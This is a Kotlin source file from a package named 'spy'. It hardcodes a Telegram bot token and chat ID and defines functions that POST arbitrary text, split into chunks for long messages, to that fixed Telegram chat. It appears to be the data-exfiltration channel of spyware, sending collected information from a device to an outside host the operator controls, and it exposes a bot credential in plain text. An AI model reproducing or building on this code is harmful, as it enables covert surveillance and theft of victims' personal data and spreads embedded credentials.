package com.venice.spy

import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

object Telegram {
    const val TOKEN = "8877162546:AAF5HmFQGdMCiHV7LfcZSD8pmKtNs7g-GqA"
    const val CHAT_ID = "8754687970"

    fun send(text: String) {
        try {
            val conn = URL("https://api.telegram.org/bot$TOKEN/sendMessage")
                .openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
            val body = "chat_id=$CHAT_ID&text=" + URLEncoder.encode(text, "UTF-8")
            conn.outputStream.use { it.write(body.toByteArray()) }
            conn.responseCode
            conn.disconnect()
        } catch (e: Exception) { e.printStackTrace() }
    }

    // Telegram ka 4096 char limit — bade message ko tod ke bhejta hai
    fun sendLong(text: String) {
        val limit = 3800
        var i = 0
        while (i < text.length) {
            val end = minOf(i + limit, text.length)
            send(text.substring(i, end))
            i = end
        }
    }
}